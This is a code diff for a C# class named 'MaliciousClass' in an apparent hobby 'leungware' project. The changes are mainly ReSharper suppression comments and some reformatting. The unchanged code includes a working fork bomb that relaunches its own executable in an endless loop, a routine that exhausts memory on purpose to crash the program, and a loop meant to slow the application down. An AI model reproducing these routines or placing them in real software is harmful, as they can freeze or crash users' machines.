@@ -10,10 +10,12 @@ namespace leungware_v420
 {
     public class MaliciousClass
     {
+        // ReSharper disable once MemberCanBeMadeStatic.Global
         public void ForkBomb(bool confirmation)
         {
             // Essentially makes new versions of this process repeatedly, with NO END
             // use with caution!
+            // ReSharper disable once LoopVariableIsNeverChangedInsideLoop
             while (confirmation)
             {
                 Process.Start(Assembly.GetExecutingAssembly().Location);
@@ -23,8 +25,10 @@ namespace leungware_v420
         private static IEnumerable<double> GetData()
         {
             // Generates a new random number.
+            // ReSharper disable once HeapView.ObjectAllocation.Evident
             Random rnd = new Random();
             // Creates a new C# List<double> to fuck with.
+            // ReSharper disable once HeapView.ObjectAllocation.Evident
             List<double> valuesDoubles = new List<double>();
             // Now, it continuously to the above List<double>, until it reaches the max value for a 64bit signed integer.
             for (long i = 0; i < long.MaxValue; i++)
@@ -37,6 +41,7 @@ namespace leungware_v420
         }
 
         // A function that uses the above GetData() function to crash the app, causing a System.OutOfMemoryException.
+        // ReSharper disable once MemberCanBeMadeStatic.Global
         public void CrashProgram()
         {
             // For rethinkingrn, try{}catch{} is essentially an if(true){}else{} for errors.
@@ -48,19 +53,23 @@ namespace leungware_v420
             // Displays an error message! 
             catch (Exception e)
             {
-                MessageBox.Show($"An error has occured, maybe try changing your settings?: {Environment.NewLine} {Environment.NewLine} {e}");
+                MessageBox.Show(
+                    // ReSharper disable once LocalizableElement
+                    $"An error has occured, maybe try changing your settings?: {Environment.NewLine} {Environment.NewLine} {e}");
                 throw;
             }
         }
 
+        // ReSharper disable once MemberCanBeMadeStatic.Global
         public void SlowDownApplication(int dividend)
         {
             // Repeatedly makes a List<double> to really slow the app.
-            for (long i = 0; (i < int.MaxValue / dividend); i++)
+            for (long i = 0; i < int.MaxValue / dividend; i++)
             {
                 // L I S T  T H I S  S T U F F 
+                // ReSharper disable once HeapView.ObjectAllocation.Evident
                 List<double> strList = new List<double> {double.MaxValue};
-            }
+            } 
         }
     }
 }
